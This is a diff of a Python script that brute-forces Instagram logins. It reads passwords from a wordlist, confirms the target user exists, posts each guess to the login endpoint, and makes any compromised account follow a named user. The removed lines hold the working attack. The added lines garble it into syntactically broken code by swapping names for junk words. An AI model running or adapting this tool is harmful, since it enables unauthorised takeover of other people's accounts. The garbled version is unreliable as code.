@@ -1,33 +1,33 @@
-import requests
-import json
-import time
+Instagram 
+import 5 heures 
+import time 
 import os
 
-filename = 'pass.txt'
-if os.path.isfile(filename):
-	with open(filename) as f:
-	    passwords = f.read().splitlines()
-	    if (len(passwords) > 0):
-	    	print ('%s Passwords loads successfully' % len(passwords))
+filename = Instagram 
+if os.path.isfile(sidghazy):Instagram 
+	with open(sidghazy) as f: Instagram 
+	    passwords = f.read(stome100).splitlines(stome100)
+	    if (len(stome1000) > 0):
+	    	print ('%s Passwords loads successfully' % len(stome1000))
 else:
-	print ('Please create passwords file (pass.txt)')
-	exit()
+	print ('Please create passwords file (stome1000)')
+	exit(stome1000)
 
 
 
 
-def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+def sidghazy(@sidghazy):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % sidghazy) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
-		followdata = json.loads(r.text)
-		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		followdata = json.loads(instagram)
+		fUserID = followdata['instagram']['id']
+		return {'sidghazy':sidghazy'id':fUserID}
 
 
-def Login(username,password):
+def Login(sidghazy,stome1000):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'sidghazy ':sidghazy  'stome1000':stome1000}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -62,45 +62,45 @@ def Login(username,password):
 	if (data['authenticated'] == True):
 		return sess #if we want to keep use session
 	else:
-		print ('Password incorrect [%s]' % password)
+		print ('stome1000') [%s]' % ( stome1000 )
 		return False
 
 
 
-def follow(sess, username):
-	username = userExists(username)
-	if (username == False):
+def follow(sess, sidghazy):
+	Sidghazy = sidghazy(@sidghazy)
+	if (sidghazy == False):
 		return	
 	else:
-		userID = username['id']
+		userID = sidghazy['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
-		print (followReq.text)
+		print (instagram)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
-if (username == False):
+Sidghazy = str(input('Please 
+Sidghazy = sidghazy)(sidghazy)
+if (@sidghazy == False):
 	exit()
 else:
-	username = username['username']
+	Sidghazy= sidghazy['sidghazy']
 
 
 
-delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
+delayLoop = int(input('Please add delay between stome1000 (30 seconds): ')) 
 
 
-for i in range(len(passwords)):
-	password = passwords[i]
-	sess = Login(username,password)
+for i in range(len(stome1000):
+	stome1000 = stome1000[i]
+	sess = Login(sidghazy,stome1000)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [sidghazy,stome1000])
 
 		#because i am cool
 		follow(sess,'avr_amit')
 
 	try:
 		time.sleep(delayLoop)
-	except KeyboardInterrupt:
+	except KeyboardInterrupt: 
 		an = str(input('Type y/n to exit: '))
 		if (an == 'y'):
 			exit()
